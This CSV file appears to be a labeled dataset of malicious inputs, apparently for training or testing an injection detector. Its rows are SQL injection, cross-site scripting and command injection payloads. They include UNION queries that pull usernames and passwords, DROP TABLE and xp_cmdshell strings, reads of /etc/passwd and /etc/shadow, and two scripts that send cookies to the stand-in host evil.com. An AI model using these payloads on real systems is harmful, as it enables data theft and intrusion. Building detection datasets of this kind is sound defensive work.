payload,label,attack_type
"' OR '1'='1",1,sqli
"' OR '1'='1' --",1,sqli
"1' UNION SELECT username, password FROM users--",1,sqli
"1 UNION SELECT null,null,null--",1,sqli
"'; DROP TABLE users; --",1,sqli
"1'; SELECT * FROM information_schema.tables--",1,sqli
"admin'--",1,sqli
"' OR 1=1--",1,sqli
"1 OR 1=1",1,sqli
"' OR 'x'='x",1,sqli
"1; EXEC xp_cmdshell('whoami')--",1,sqli
"1 UNION ALL SELECT NULL,NULL,NULL--",1,sqli
"' AND 1=2 UNION SELECT username,password FROM admin--",1,sqli
"1' AND SLEEP(5)--",1,sqli
"1' WAITFOR DELAY '0:0:5'--",1,sqli
"' AND (SELECT * FROM (SELECT(SLEEP(5)))--",1,sqli
"1 AND 1=2 UNION SELECT 1,2,3--",1,sqli
"'; INSERT INTO users(name,pass) VALUES('hacker','1234')--",1,sqli
"1' ORDER BY 3--",1,sqli
"1' GROUP BY 1--",1,sqli
"1' HAVING 1=1--",1,sqli
"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",1,sqli
"' UNION SELECT @@version--",1,sqli
"1'; UPDATE users SET password='hacked' WHERE '1'='1",1,sqli
"1 OR 'a'='a",1,sqli
"' OR ''='",1,sqli
"1; SELECT load_file('/etc/passwd')--",1,sqli
"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",1,sqli
"1 UNION SELECT table_name FROM information_schema.tables--",1,sqli
"admin' AND '1'='1",1,sqli
"1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--",1,sqli
"' OR BENCHMARK(10000000,MD5(1))--",1,sqli
"<script>alert('xss')</script>",1,xss
"<script>alert(document.cookie)</script>",1,xss
"<img src=x onerror=alert(1)>",1,xss
"<img src=x onerror='alert(document.domain)'>",1,xss
"<svg onload=alert(1)>",1,xss
"<body onload=alert('xss')>",1,xss
"javascript:alert(1)",1,xss
"javascript:void(document.write('<script>alert(1)</script>'))",1,xss
"<a href='javascript:alert(1)'>click</a>",1,xss
"<iframe src='javascript:alert(1)'></iframe>",1,xss
"<input type='text' onfocus='alert(1)'>",1,xss
"<div onmouseover='alert(1)'>hover</div>",1,xss
"<script>document.location='http://evil.com/'+document.cookie</script>",1,xss
"<img src=1 onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",1,xss
"<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>",1,xss
"<details open ontoggle=alert(1)>",1,xss
"<video><source onerror=alert(1)>",1,xss
"<svg><script>alert(1)</script></svg>",1,xss
"<math><mtext></table></math><img src onerror=alert(1)>",1,xss
"<base href='javascript:'>",1,xss
"<form><button formaction='javascript:alert(1)'>click</button></form>",1,xss
"<style>body{background:url('javascript:alert(1)')}</style>",1,xss
"&lt;script&gt;alert(1)&lt;/script&gt;",1,xss
"%3Cscript%3Ealert(1)%3C%2Fscript%3E",1,xss
"<Script>alert(1)</Script>",1,xss
"<SCRIPT>alert(1)</SCRIPT>",1,xss
"<scr<script>ipt>alert(1)</scr</script>ipt>",1,xss
"<script >alert(1)</script >",1,xss
"<<script>script>alert(1)<</script>/script>",1,xss
"; cat /etc/passwd",1,command_injection
"| whoami",1,command_injection
"& whoami",1,command_injection
"; ls -la",1,command_injection
"| ls -la /bin/sh",1,command_injection
"; cat /etc/shadow",1,command_injection
"| id",1,command_injection
"; id; whoami",1,command_injection
